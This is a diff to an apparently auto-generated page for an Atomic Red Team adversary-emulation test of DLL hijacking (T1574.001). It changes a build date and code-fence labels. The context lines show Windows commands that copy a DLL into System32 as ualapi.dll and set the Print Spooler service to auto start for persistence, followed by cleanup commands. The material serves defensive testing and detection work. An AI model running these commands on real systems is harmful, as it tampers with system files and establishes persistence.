@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1574.001"
 attack_technique_name: "Hijack Execution Flow: DLL"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "5898902d-c5ad-479a-8545-6f5ab3cfc87f"
@@ -48,7 +48,7 @@ Print Spooler service is also configured to auto start. Reboot of system is requ
 
 ### Command
 
-```commandprompt
+```cmd
 copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
 ren %APPDATA%\amsi.dll ualapi.dll
 copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
@@ -57,7 +57,7 @@ sc config Spooler start=auto
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del %windir%\System32\ualapi.dll
 del %APPDATA%\ualapi.dll
 ```
